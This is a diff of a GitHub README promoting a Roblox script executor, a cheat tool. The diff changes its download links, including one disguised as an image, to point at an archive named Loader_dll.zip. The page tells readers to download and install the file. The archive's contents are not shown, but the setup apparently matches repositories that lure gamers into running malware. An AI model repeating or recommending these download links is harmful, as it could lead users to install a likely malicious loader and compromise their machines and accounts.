@@ -260,7 +260,7 @@
 
 Welcome to the Roexec Krampus Executor repository! 🚀 This repository hosts the latest version of the Roexec Krampus Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Roexec Krampus Executor](https://github.com/secondlathloothy/Roexec-Krampus-Executor/releases/download/Download/application.zip)
+![Roexec Krampus Executor](https://github.com/secondlathloothy/Roexec-Krampus-Executor/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -755,7 +755,7 @@ Roexec Krampus Executor is a cutting-edge executor designed for Roblox script ex
 
 To get started with Roexec Krampus Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Roexec Krampus Executor](https://img.shields.io/badge/Download-Roexec Krampus%20Executor-orange)](https://github.com/secondlathloothy/Roexec-Krampus-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Roexec Krampus Executor](https://img.shields.io/badge/Download-Roexec Krampus%20Executor-orange)](https://github.com/secondlathloothy/Roexec-Krampus-Executor/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
